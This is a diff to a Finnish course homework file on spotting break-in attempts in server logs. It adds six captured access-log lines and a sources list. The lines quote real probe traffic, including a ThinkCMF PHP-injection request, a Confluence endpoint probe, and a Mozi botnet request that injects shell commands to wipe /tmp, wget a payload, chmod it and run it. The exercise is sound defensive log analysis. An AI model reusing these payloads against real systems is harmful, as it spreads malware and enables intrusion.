@@ -87,8 +87,25 @@
 
 #### *d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.*
 
+> 172.104.131.24 - - [17/Sep/2021:07:51:22 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 0 "-" "-"
+
+> 61.219.11.151 - - [17/Sep/2021:04:00:04 +0000] "dN\x93\xb9\xe6\xbcl\xb6\x92\x84:\xd7\x03\xf1N\xb9\xc5;\x90\xc2\xc6\xba\xe1I-\"\xdds\xba\x1fgC:\xb1\xa7\x80+" 400 0 "-" "-"
+
+> 45.146.164.110 - - [17/Sep/2021:04:57:59 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+
+> 120.86.237.41 - - [16/Sep/2021:13:27:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 494 "-" "Hello, world"
+
+> 217.112.83.246 - - [17/Sep/2021:07:59:29 +0000] "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 404 438 "-" "python-requests/2.18.4"
+
+> 39.103.150.70 - - [16/Sep/2021:17:07:33 +0000] "GET /robots.txt HTTP/1.1" 404 438 "-" "fasthttp"
 
 
 
 
+
+
+Lähteet:
+
+- https://ipinfo.io/AS7713/180.252.0.0/16-180.252.248.0/23
+- Censys: https://techcrunch.com/2020/08/05/censys-internet-device-search-series-a/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw_c2E9dCZyY3Q9aiZxPSZlc3JjPXMmc291cmNlPXdlYiZjZD0mdmVkPTJhaFVLRXdpWjVjak12b2J6QWhVNkNSQUlIYmtCQ2w4UUZub0VDQjRRQVEmdXJsPWh0dHBzJTNBJTJGJTJGdGVjaGNydW5jaC5jb20lMkYyMDIwJTJGMDglMkYwNSUyRmNlbnN5cy1pbnRlcm5ldC1kZXZpY2Utc2VhcmNoLXNlcmllcy1hJTJGJnVzZz1BT3ZWYXczNmhTVDNyVFZoLXhNcldHNXl1RkxX&guce_referrer_sig=AQAAADBEvZ_FF0n92J5gOo2mrGYTm1VR1DEVNeN_vbkMc-p9hWagfhZgO8x_k7zq1I9px7afdexYv7ZwWzPXdrl8qZZD8uqc_Z98oTHHcnLR6NnxvsAiB1dgHoJE0j4lOVzeLJbUPsoR8-qKPxgOgA7Nt-hlK6Xk9xuDTQabWj1dnQQL
 
